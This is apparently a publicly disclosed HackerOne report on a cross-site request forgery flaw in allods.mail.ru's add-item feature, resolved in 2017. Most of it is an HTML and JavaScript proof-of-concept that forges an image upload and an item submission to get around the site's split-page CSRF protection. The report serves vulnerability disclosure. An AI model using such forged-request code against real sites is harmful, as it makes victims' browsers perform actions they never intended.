...
h1_id: '178241'
original_report_id: '178241'
title: '[allods.mail.ru] Cross-Site Request Forgery (Add-Item)'
weakness: Cross-Site Request Forgery (CSRF)
team_handle: mailru
created_at: '2016-10-26T15:43:11.782Z'
disclosed_at: '2017-03-17T13:07:39.866Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
...
- HackerOne Report ID: 178241
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: mailru
- Disclosed At: 2017-03-17T13:07:39.866Z
- Has Bounty: No
- Visibility: full
- Substate: resolved
...
**_More Details_**:
The upload picture, and the submit form was in different pages for extra-protection for CSRF, I had to bypass it by first loading the picture and then submiting the form to add the item. 
...
```
<html>
<head><title>MailRu CSRF PoC</title></head>
<body>
<center>
<h1>Full CSRF PoC For allods.mail.ru Add-Item CSRF</h1>
<!-- Since the upload picture, and the submit form was in different pages for extra-protection for CSRF, I had to bypass it by 
First loading the picture and then submiting the form to add the item. -->
<br>
<hr>
<h2>First click the button below:</h2><br>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://allods.mail.ru/mediafile.php", true);
        ...
        var body = "-----------------------------149631704917378\r\n" + 
          ...
          "!\xa7!\xaap\xdb\x14\x07\x8c\x10\xf4i:\xd0\x9d\xd4\xa4\x13\xf2\x03M\x11\x00\xec\xf8\xd7\xd6\x8c\x9a\x85T\xc7\xc2\xe3\x86\xe1\x93\x91^\xc8\xdf\xd1r\xf7\xc8B\xde/\xcc\xd8\t\xf9\x1a/\x01\x93&b\xd3\x17#\x93\x10\xd6Z?/\xcc\xab\x9bF\xe1k\x13\x01\xcb\xb7f!_\xbf\xee\xbb(\x01\x1f5\x01B\xfe\xfe\xaa-j`hd\xc0B\xaa\xe28\xbe\x01+\xf3\x03\x12\xaa\xb9\x14\xe5\xc0\xc5-\xc2\xd6\xf9\x92\x8b\x90\x8f\x13\xc80\xbc\xcb\x18&\xc0C5\x81B\xde[\xe0V\x08\xf1\r\xb1\x80~O\x85\n" + 
...
<br>
<hr>
<h2>Now click on this button:</h2><br>
    <form action="https://allods.mail.ru/media.php" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="do" value="saveitem" />
